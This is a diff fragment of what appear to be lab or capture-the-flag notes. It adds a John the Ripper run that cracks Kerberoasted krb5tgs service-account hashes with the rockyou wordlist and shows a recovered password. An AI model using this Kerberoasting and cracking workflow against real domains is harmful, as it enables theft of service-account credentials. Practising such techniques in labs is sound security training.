@@ -250,3 +250,12 @@ HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <n
 [-] CCache file is not found. Skipping...
 
 this should give us hashes to these services listed above
+
+root@ip-10-201-48-39:~# john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:42 71.13% (ETA: 18:35:28) 0g/s 242581p/s 1212Kc/s 1212KC/s alynahs#1mommy..alycia0211
+Password123!!    (?)
+
